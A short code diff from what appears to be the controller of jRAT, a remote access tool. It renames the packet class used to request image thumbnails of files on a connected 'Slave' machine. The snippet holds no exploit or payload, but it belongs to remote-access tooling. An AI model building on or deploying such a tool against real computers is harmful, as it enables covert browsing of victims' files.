@@ -3,7 +3,7 @@ package jrat.module.fs.ui;
 import iconlib.IconUtils;
 import jrat.controller.Slave;
 import jrat.controller.utils.Utils;
-import jrat.module.fs.packets.Packet85ThumbnailPreview;
+import jrat.module.fs.packets.PacketRequestImageThumbnail;
 
 import javax.imageio.ImageIO;
 import javax.swing.*;
@@ -138,7 +138,7 @@ public class PanelThumbView extends JPanel {
 		
 		setProgress(0);
 		for (String str : files) {
-			slave.addToSendQueue(new Packet85ThumbnailPreview(str));
+			slave.addToSendQueue(new PacketRequestImageThumbnail(str));
 		}	
 	}
 
